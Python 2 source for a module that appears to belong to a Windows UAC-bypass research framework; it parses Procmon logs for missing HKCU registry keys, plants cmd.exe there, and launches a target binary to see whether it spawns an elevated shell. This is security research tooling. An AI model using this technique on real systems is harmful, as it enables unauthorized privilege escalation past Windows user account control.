from module import Module
from modules.investigate.procmon_xml_parser import CustomModule as Xml_parser
from support.winreg import Registry
from _winreg import HKEY_CURRENT_USER as HKCU
import subprocess
import psutil
import time


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Fileless discovery",
                       "Description": "This module search in a list of binaries for fileless UAC bypasses",
                       "Author": "Santiago Hernandez Ramos"}

        # -----------name-----default_value--description
        options = {"binary": [None, "Target of the UAC fileless bypass search", False],
                   "xml_file": [None, "Path to a procmon like XML file", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._results = []
        self.p = None
        self.events = None
        self.events_nf = None
        self.reg = None

    # This module must be always implemented, it is called by the run option
    def run_module(self):

        self.init_import_modules()

        self.events = self.p.events()
        self.events_nf = self.p.events_notfound(self.events)
        openkey_nf = self.events_nf_openkey()
        queryvalue_nf = self.events_nf_queryvalue()

        print "[*] Searching for openkey not found values"
        for p in self.get_paths_byword(openkey_nf, None):
            print "[*] Inserting into %s" % str(p)
            k = self.reg.create_key(HKCU, "\\".join(p.split("\\")[1:]))
            self.reg.set_value(HKCU, "\\".join(
                p.split("\\")[1:]), "C:\\Windows\\System32\\cmd.exe")

            previous_pid = psutil.pids()
            self.execute(self.args["binary"])
            time.sleep(2)
            new_pid = psutil.pids()

            if self.is_cmd_open():
                self._results.append(str(p))
                self.kill('cmd')
            else:
                self.kill(self.args["binary"].split(
                    '.')[0], previous_pid, new_pid)

            self.reg.restore(k)

        #########################################################
        print "[*] Searching for queryvalue not found values"
        for p in self.get_paths_byword(queryvalue_nf, None):
            print "[*] Inserting into %s" % str(p)
            k = self.reg.create_key(HKCU, "\\".join(p.split("\\")[1:-1]))
            self.reg.create_value(k, p.split(
                "\\")[-1], "C:\\Windows\\System32\\cmd.exe")

            previous_pid = psutil.pids()
            self.execute(self.args["binary"])
            time.sleep(2)
            new_pid = psutil.pids()

            if self.is_cmd_open():
                self._results.append(str(p))
                self.kill('cmd')
            else:
                self.kill(self.args["binary"].split(
                    '.')[0], previous_pid, new_pid)

            self.reg.restore(k, p.split("\\")[-1])

        self.results()

    def init_import_modules(self):
        self.p = Xml_parser()
        self.p.set_value("xml_path", self.args["xml_file"])
        self.p.parse_tree()
        self.reg = Registry()

    def results(self):
        for r in self._results:
            print r

    def kill(self, proc, last_pids=None, new_pids=None):
        new_pids = self.last_process_created(last_pids, new_pids)
        try:
            for p in new_pids:
                subprocess.check_call(["tskill", str(p)])
        except subprocess.CalledProcessError:
            print "[!!] The process %s can't be killed" % proc
            return

    def last_process_created(self, prev_pids, new_pids):
        pids = []
        for p in new_pids:
            if p not in prev_pids:
                pids.append(p)
        return pids

    def execute(self, proc):
        try:
            subprocess.Popen([proc])
        except subprocess.CalledProcessError as error:
            raise error
        except WindowsError:
            print "[!!] The application can't be executed in win32 mode"
            return

    def is_cmd_open(self):
        try:
            return 'cmd.exe' in [psutil.Process(p).name() for p in psutil.pids()]
        except:
            pass

    def events_nf_openkey(self):
        self.p.set_value("word", "HKCU")
        self.p.set_value("operation", "RegOpenKey")
        events_nf_hkcu = self.p.events_word(self.events_nf)
        return self.p.events_operation(events_nf_hkcu)

    def events_nf_queryvalue(self):
        self.p.set_value("word", "HKCU")
        self.p.set_value("operation", "RegQueryValue")
        events_nf_hkcu = self.p.events_word(self.events_nf)
        return self.p.events_operation(events_nf_hkcu)

    def get_paths_byword(self, events, intext):
        if intext is not None:
            return [p.text for e in events
                    for p in e.findall('.//Path')
                    if intext in p.text]
        else:
            return self.p.paths(events)
